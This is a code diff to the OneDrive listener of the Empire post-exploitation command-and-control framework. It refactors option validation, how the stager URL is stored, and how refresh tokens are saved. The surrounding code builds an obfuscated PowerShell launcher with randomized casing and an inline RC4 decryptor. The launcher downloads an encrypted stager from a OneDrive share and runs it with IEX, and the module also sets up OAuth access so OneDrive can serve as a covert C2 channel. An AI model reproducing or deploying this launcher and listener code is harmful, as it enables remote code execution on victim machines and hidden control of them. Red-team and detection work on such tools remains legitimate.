@@ -9,21 +9,23 @@ import time
 import traceback
 from builtins import object
 from builtins import str
-from typing import List
+from typing import List, Tuple, Optional
 
+from empire.server.database.base import SessionLocal
 from pydispatch import dispatcher
 from requests import Request, Session
 
 from empire.server.common import encryption
 from empire.server.common import helpers
 from empire.server.utils import data_util
+from empire.server.utils.module_util import handle_validate_message
 
 
 class Listener(object):
     def __init__(self, mainMenu, params=[]):
         self.info = {
             'Name': 'Onedrive',
-            'Author': ['@mr64bit'],
+            'Authors': ['@mr64bit'],
             'Description': (
                 'Starts a Onedrive listener. Setup instructions here:        gist.github.com/mr64bit/3fd8f321717c9a6423f7949d494b6cd9'),
             'Category': ('third_party'),
@@ -48,7 +50,7 @@ class Listener(object):
             },
             'AuthCode': {
                 'Description': 'Auth code given after authenticating OAuth App.',
-                'Required': True,
+                'Required': False,
                 'Value': ''
             },
             'BaseFolder': {
@@ -133,6 +135,8 @@ class Listener(object):
             }
         }
 
+        self.stager_url = ''
+
         self.mainMenu = mainMenu
         self.threads = {}
 
@@ -141,7 +145,7 @@ class Listener(object):
     def default_response(self):
         return ''
 
-    def validate_options(self):
+    def validate_options(self) -> Tuple[bool, Optional[str]]:
 
         self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]
 
@@ -149,23 +153,22 @@ class Listener(object):
         if (str(self.options['RefreshToken']['Value']).strip() == '') and (
                 str(self.options['AuthCode']['Value']).strip() == ''):
             if (str(self.options['ClientID']['Value']).strip() == ''):
-                print(helpers.color("[!] ClientID needed to generate AuthCode URL!"))
-                return "[!] ClientID needed to generate AuthCode URL!"
+                return handle_validate_message("[!] ClientID needed to generate AuthCode URL!")
             params = {'client_id': str(self.options['ClientID']['Value']).strip(),
                       'response_type': 'code',
                       'redirect_uri': self.options['RedirectURI']['Value'],
                       'scope': 'files.readwrite offline_access'}
             req = Request('GET', 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize', params=params)
             prep = req.prepare()
-            print(helpers.color("[*] Get your AuthCode from \"%s\" and try starting the listener again." % prep.url))
-            return f"[*] Get your AuthCode from \"{prep.url}\" and try starting the listener again."
+            # TODO Do we need to differentiate between the two-step creation message and an error?
+            return handle_validate_message(f"[*] Get your AuthCode from \"{prep.url}\" and try starting the listener again.")
 
         for key in self.options:
             if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                 print(helpers.color("[!] Option \"%s\" is required." % (key)))
-                return "[!] Option \"%s\" is required." % (key)
+                return handle_validate_message(f"[!] Option \"{key}\" is required.")
 
-        return True
+        return True, None
 
     def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default',
                           proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='',
@@ -174,10 +177,16 @@ class Listener(object):
 
         if not language:
             print(helpers.color("[!] listeners/onedrive generate_launcher(): No language specified"))
+            return None
 
-        if listenerName and (listenerName in self.threads) and (
-                listenerName in self.mainMenu.listeners.activeListeners):
-            listener_options = self.mainMenu.listeners.activeListeners[listenerName]['options']
+        # Previously, we had to do a lookup for the listener and check through threads on the instance.
+        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
+        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
+        if True:  # The true check is just here to keep the indentation consistent with the old code.
+            active_listener = self
+            # extract the set options for this instantiated listener
+            listener_options = active_listener.options
+
             staging_key = listener_options['StagingKey']['Value']
             profile = listener_options['DefaultProfile']['Value']
             launcher_cmd = listener_options['Launcher']['Value']
@@ -241,7 +250,7 @@ class Listener(object):
                     '$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
 
                 launcher += helpers.randomize_capitalization("$data=$wc.DownloadData('")
-                launcher += self.mainMenu.listeners.activeListeners[listenerName]['stager_url']
+                launcher += self.stager_url
                 launcher += helpers.randomize_capitalization("');$iv=$data[0..3];$data=$data[4..$data.length];")
 
                 launcher += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
@@ -585,7 +594,7 @@ class Listener(object):
                            headers={"Content-Type": "application/json"})
                 stager_url = "https://api.onedrive.com/v1.0/shares/%s/driveitem/content" % r.json()['shareId']
                 # Different domain for some reason?
-                self.mainMenu.listeners.activeListeners[listener_name]['stager_url'] = stager_url
+                self.stager_url = stager_url
 
             else:
                 print(helpers.color("[!] Something went wrong uploading stager"))
@@ -643,7 +652,7 @@ class Listener(object):
         while True:
             # Wait until Empire is aware the listener is running, so we can save our refresh token and stager URL
             try:
-                if listener_name in list(self.mainMenu.listeners.activeListeners.keys()):
+                if self.mainMenu.listenersv2.get_active_listener_by_name(listener_name):
                     upload_stager()
                     upload_launcher()
                     break
@@ -666,8 +675,11 @@ class Listener(object):
                     dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
                     upload_stager()
                 if token['update']:
-                    self.mainMenu.listeners.update_listener_options(listener_name, "RefreshToken",
-                                                                    token['refresh_token'])
+                    with SessionLocal.begin() as db:
+                        self.options['RefreshToken']['Value'] = token['refresh_token']
+                        db_listener = self.mainMenu.listenersv2.get_by_name(db, listener_name)
+                        db_listener.options = self.options
+
                     token['update'] = False
 
                 search = s.get("%s/drive/root:/%s/%s?expand=children" % (base_url, base_folder, staging_folder))
